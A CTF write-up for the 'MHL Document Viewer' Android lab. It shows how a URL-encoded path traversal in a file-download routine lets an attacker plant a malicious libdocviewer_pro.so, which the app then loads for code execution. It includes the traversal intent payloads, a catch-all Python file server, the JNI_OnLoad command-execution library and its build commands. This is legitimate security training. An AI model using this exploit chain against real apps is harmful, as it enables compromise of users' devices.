---
date: '2025-04-07T22:16:32+08:00'
title: 'MHL Document Viewer'
tags:
    - MHL
    - Android CTF
---

## Challenge Description
> Welcome to the Remote Code Execution (RCE) Challenge! This lab provides a real-world scenario where you'll explore vulnerabilities in popular software. Your mission is to exploit a path traversal vulnerability combined with dynamic code loading to achieve remote code execution.
>
> [documentviewer.apk](static/documentviewer.apk)

## Solution

I started out by working on static analysis.

### Static Analysis

As usual, I check the `AndroidManifest.xml`.

```xml
<activity
    android:name="com.mobilehackinglab.documentviewer.MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="file"/>
        <data android:scheme="http"/>
        <data android:scheme="https"/>
        <data android:mimeType="application/pdf"/>
    </intent-filter>
</activity>
```

There is only one `MainActivity` activity and it has the intent filter where it accept some URI parameter. 

```java
@Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    ActivityMainBinding inflate = ActivityMainBinding.inflate(getLayoutInflater());
    Intrinsics.checkNotNullExpressionValue(inflate, "inflate(...)");
    this.binding = inflate;
    if (inflate == null) {
        Intrinsics.throwUninitializedPropertyAccessException("binding");
        inflate = null;
    }
    setContentView(inflate.getRoot());
    BuildersKt__Builders_commonKt.launch$default(GlobalScope.INSTANCE, null, null, new MainActivity$onCreate$1(this, null), 3, null);
    setLoadButtonListener();
    handleIntent();
    loadProLibrary();
    if (this.proFeaturesEnabled) {
        initProFeatures();
    }
}
```

Starting with `onCreate` function, the things to get note here is it loads 3 different function, `setLoadButtonListener`, `handleIntent` and `loadProLibrary`.

```java
private final void handleIntent() {
    Intent intent = getIntent();
    String action = intent.getAction();
    Uri data = intent.getData();
    if (Intrinsics.areEqual("android.intent.action.VIEW", action) && data != null) {
        CopyUtil.INSTANCE.copyFileFromUri(data).observe(this, new MainActivity$sam$androidx_lifecycle_Observer$0(new Function1<Uri, Unit>() { // from class: com.mobilehackinglab.documentviewer.MainActivity$handleIntent$1
            {
                super(1);
            }

            @Override // kotlin.jvm.functions.Function1
            public /* bridge */ /* synthetic */ Unit invoke(Uri uri) {
                invoke2(uri);
                return Unit.INSTANCE;
            }

            /* renamed from: invoke, reason: avoid collision after fix types in other method */
            public final void invoke2(Uri uri) {
                MainActivity mainActivity = MainActivity.this;
                Intrinsics.checkNotNull(uri);
                mainActivity.renderPdf(uri);
            }
        }));
    }
}
```

This `handleIntent` function basically get data from incoming intent and it will run `CopyUtil.INSTANCE.copyFileFromUri` and `renderPdf` function. 

```java
private final void loadProLibrary() {
    try {
        String abi = Build.SUPPORTED_ABIS[0];
        File libraryFolder = new File(getApplicationContext().getFilesDir(), "native-libraries/" + abi);
        File libraryFile = new File(libraryFolder, "libdocviewer_pro.so");
        System.load(libraryFile.getAbsolutePath());
        this.proFeaturesEnabled = true;
    } catch (UnsatisfiedLinkError e) {
        Log.e(TAG, "Unable to load library with Pro version features! (You can ignore this error if you are using the Free version)", e);
        this.proFeaturesEnabled = false;
    }
}
```

As for the `loadProLibrary` function, it seems to be trying to load a native library called `libdocviewer_pro.so` in the specific path. this could be my endpoint of performing RCE if I could write a file in that endpoint. 

```java
public final MutableLiveData<Uri> copyFileFromUri(Uri uri) {
    Intrinsics.checkNotNullParameter(uri, "uri");
    URL url = new URL(uri.toString());
    File file = CopyUtil.DOWNLOADS_DIRECTORY;
    String lastPathSegment = uri.getLastPathSegment();
    if (lastPathSegment == null) {
        lastPathSegment = "download.pdf";
    }
    File outFile = new File(file, lastPathSegment);
    MutableLiveData liveData = new MutableLiveData();
    BuildersKt__Builders_commonKt.launch$default(GlobalScope.INSTANCE, Dispatchers.getIO(), null, new CopyUtil$Companion$copyFileFromUri$1(outFile, url, liveData, null), 2, null);
    return liveData;
}
```

Moving to `copyFileFromUri` function, it will download the file from provided URI to `externalStoragePublicDirectory` which is the Download folder of the android. Based on the code, it is possible to save file to another file directory by abusing the `getLastPathSegment` function. The `getLastPathSegment` function will take the word on the last `/` and I could bypass this using url encode method `%2f`. From my current understanding, I believe it is possible to write a file anywhere with this `copyFileFromUri` function. I then proceed to dynamic analysis to test out the idea.

### Dynamic Analysis

I started out by playing around with the APK first.

```bash
04-07 23:36:52.050 19367 19367 E Companion: Unable to load library with Pro version features! (You can ignore this error if you are using the Free version)
04-07 23:36:52.050 19367 19367 E Companion: java.lang.UnsatisfiedLinkError: dlopen failed: library "/data/user/0/com.mobilehackinglab.documentviewer/files/native-libraries/arm64-v8a/libdocviewer_pro.so" not found
```

Looking into the logcat, I noticed that it is trying to run `loadProLibrary` function. It also provide me the path that it is looking at `/data/user/0/com.mobilehackinglab.documentviewer/files/native-libraries/arm64-v8a/libdocviewer_pro.so`. 

```bash
adb shell am start -a android.intent.action.VIEW -d 'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf' -t application/pdf
Starting: Intent { act=android.intent.action.VIEW dat=https://www.w3.org/... typ=application/pdf }
```

I then started a simple intent that provide dummy pdf to see how it works.

![alt text](img/index.png#center)

It basically just render the PDF file into the application. 

```bash
beryllium:/sdcard/Download # ls -la
total 80
-rw-rw---- 1 root everybody 13264 2025-04-07 23:41 dummy.pdf
```

After looking into my Download folder, the `dummy.pdf` is downloaded and saved inside the Download folder. I then tried to see if it's possible to save the file in other place. To do so, I started a simple web server that will just provide the same content even the file name is different. 

```powershell
PS C:\Users\kskin> adb shell am start -a android.intent.action.VIEW -d 'http://192.168.68.107:8000/test.pdf' -t application/pdf
Starting: Intent { act=android.intent.action.VIEW dat=http://192.168.68.107:8000/... typ=application/pdf }
PS C:\Users\kskin> adb shell am start -a android.intent.action.VIEW -d 'http://192.168.68.107:8000/..%2fDocuments%2ftest.pdf' -t application/pdf
Starting: Intent { act=android.intent.action.VIEW dat=http://192.168.68.107:8000/... typ=application/pdf }
```

```bash
python -c "from http.server import *;HTTPServer(('',8000),type('',(BaseHTTPRequestHandler,),{'do_GET':lambda s:(s.send_response(200),s.end_headers(),s.wfile.write(open('sample.pdf','rb').read()))})).serve_forever()"
192.168.68.109 - - [07/Apr/2025 23:46:51] "GET /test.pdf HTTP/1.1" 200 -
192.168.68.109 - - [07/Apr/2025 23:50:55] "GET /..%2fDocuments%2ftest.pdf HTTP/1.1" 200 -
```

I tried performing 2 intent where one contains a simple path traveral with url encoding to see if its possible to save the file in another directory.

```bash
beryllium:/data/media/0/Documents # ls -la
total 36
drwxrwsr-x  3 media_rw media_rw  4096 2025-04-07 23:50 .
drwxrws--- 24 media_rw media_rw  4096 2025-03-30 14:19 ..
-rw-rw-r--  1 media_rw media_rw 18810 2025-04-07 23:50 test.pdf
```

It is possible to write file into another directory. By abusing this vulnerability, it is possible for me to write a shared library into the specific directory but to do so, I will need to create one shared library. 

```cpp
#include <jni.h>
#include <cstdlib>

JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved) {
    system("whoami >> /sdcard/Download/test.txt");
    return JNI_VERSION_1_6;
}
```

I write a simple C++ code that abuse the `JNI_OnLoad` function to instead load the command execution when the shared library is loaded. 

```powershell
PS E:\Desktop\Android\APK\MHL> E:\\app\\android-sdk\\ndk\\27.0.12077973\\toolchains\\llvm\\prebuilt\\windows-x86_64\\bin\\clang++.exe --target=aarch64-none-linux-android30 --sysroot=E:/app/android-sdk/ndk/27.0.12077973/toolchains/llvm/prebuilt/windows-x86_64/sysroot -o .\test.cpp.o -c .\test.cpp
PS E:\Desktop\Android\APK\MHL> E:\\app\\android-sdk\\ndk\\27.0.12077973\\toolchains\\llvm\\prebuilt\\windows-x86_64\\bin\\clang++.exe --target=aarch64-none-linux-android30 --sysroot=E:/app/android-sdk/ndk/27.0.12077973/toolchains/llvm/prebuilt/windows-x86_64/sysroot --shared -static-libstdc++ -o .\libdocviewer_pro.so .\test.cpp.o
```

This is the command for me to compile an amd64 shared library. To make life easier, it is better to use Android studio to compile it instead of using my method. After compiling it, I use the simple http server from python to host my shared library and abuse the path traversal vulnerability to write the shared library into the specific directory.

```powershell
PS E:\Desktop\Android\apk\mhl> adb shell am start -a android.intent.action.VIEW -d 'http://192.168.68.107:8000/..%2F..%2F..%2F..%2Fdata%2Fuser%2F0%2Fcom.mobilehackinglab.documentviewer%2Ffiles%2Fnative-libraries%2Farm64-v8a%2Flibdocviewer_pro.so' -t application/pdf
Starting: Intent { act=android.intent.action.VIEW dat=http://192.168.68.107:8000/... typ=application/pdf }
```

```bash
python -c "from http.server import *;HTTPServer(('',8000),type('',(BaseHTTPRequestHandler,),{'do_GET':lambda s:(s.send_response(200),s.end_headers(),s.wfile.write(open('libdocviewer_pro.so','rb').read()))})).serve_forever()"
192.168.68.109 - - [08/Apr/2025 00:01:39] "GET /..%2F..%2F..%2F..%2Fdata%2Fuser%2F0%2Fcom.mobilehackinglab.documentviewer%2Ffiles%2Fnative-libraries%2Farm64-v8a%2Flibdocviewer_pro.so HTTP/1.1" 200 -
```

```bash
beryllium:/ # ls -la /data/user/0/com.mobilehackinglab.documentviewer/files/native-libraries/arm64-v8a/
total 16
drwx------ 2 u0_a343 u0_a343 4096 2025-04-08 00:01 .
drwx------ 3 u0_a343 u0_a343 4096 2025-04-08 00:01 ..
-rw------- 1 u0_a343 u0_a343 5496 2025-04-08 00:01 libdocviewer_pro.so
```

After confirming the file is successfully write into the desired endpoint, the shared library should be executed if I just restart the application. 

![alt text](img/index-1.png#center)

When I restart the application, it stop working because of this error from logcat.

```bash
04-08 00:06:05.242 24335 24335 E AndroidRuntime: FATAL EXCEPTION: main
04-08 00:06:05.242 24335 24335 E AndroidRuntime: Process: com.mobilehackinglab.documentviewer, PID: 24335
04-08 00:06:05.242 24335 24335 E AndroidRuntime: java.lang.UnsatisfiedLinkError: No implementation found for void com.mobilehackinglab.documentviewer.MainActivity.initProFeatures() (tried Java_com_mobilehackinglab_documentviewer_MainActivity_initProFeatures and Java_com_mobilehackinglab_documentviewer_MainActivity_initProFeatures__)
```

This basically means the shared library looking for a function `initProFeatures` which is not provided in the shared library but it is loaded in `onCreate` function in `MainActivity`. Although it has error, the command execution is still successful due to the `onLoad` function in shared library. 

```bash
beryllium:/sdcard/Download # cat test.txt
u0_a343
u0_a343
u0_a343
u0_a343
```

This means that my RCE is successful despite having some minor error which could be easily fixed by adding the required function. It is also possible to write a POC app to send the intent which exploit the path traversal write and restart the application. 

## Things I learned from this challenge

- compiling and linking the shared library.
- writing a command execution shared library.
- creating a simple HTTP server that redirects to the same file no matter what the endpoint is.
- abusing `getLastPathSegment` function to perform path traversal write. 